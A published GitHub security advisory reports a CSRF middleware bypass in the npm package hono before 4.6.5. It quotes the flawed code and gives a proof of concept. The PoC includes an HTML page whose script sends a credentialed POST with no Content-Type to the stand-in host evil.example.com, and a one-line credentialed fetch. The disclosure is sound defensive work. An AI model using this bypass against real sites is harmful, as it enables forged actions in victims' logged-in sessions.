# Bypass CSRF Middleware by a request without Content-Type header

Moderate

published
GHSA-2234-fmw7-43wr
Oct 15, 2024

## Package

npm

hono
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

< 4.6.5

## Patched versions

4.6.5

## Description

### Summary

Bypass CSRF Middleware by a request without Content-Type herader.

### Details

Although the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.

[hono/src/middleware/csrf/index.ts](https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89)

Lines 76 to 89
in
[cebf4e8](/honojs/hono/commit/cebf4e87f3984a6a034e60a43f542b4c5225b668)

|  | return async function csrf(c, next) { |
| --- | --- |
|  | if ( |
|  | !isSafeMethodRe.test(c.req.method) && |
|  | isRequestedByFormElementRe.test(c.req.header('content-type') || '') && |
|  | !isAllowedOrigin(c.req.header('origin'), c) |
|  | ) { |
|  | const res = new Response('Forbidden', { |
|  | status: 403, |
|  | }) |
|  | throw new HTTPException(403, { res }) |
|  | } |
|  |  |
|  | await next() |
|  | } |

### PoC

```
// server.js
import { Hono } from 'hono'
import { csrf }from 'hono/csrf'
const app = new Hono()
app.use(csrf())
app.get('/', (c) => {
  return c.html('Hello Hono!')
})
app.post('/', async (c) => {
  console.log("executed")
  return c.text( await c.req.text())
})
Deno.serve(app.fetch)
```

```
<!-- PoC.html -->
<script>
async function myclick() {
    await fetch("http://evil.example.com", {
    method: "POST",
    credentials: "include",
    body:new Blob([`test`],{}),
    });
}
</script>
<input type="button" onclick="myclick()" value="run" />
```

Similarly, the fetch API does not add a Content-Type header for requests that do not include a Body.

```
await fetch("http://localhost:8000", { method: "POST", credentials: "include"});
```
### Impact

Bypass csrf protection implemented with hono csrf middleware.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
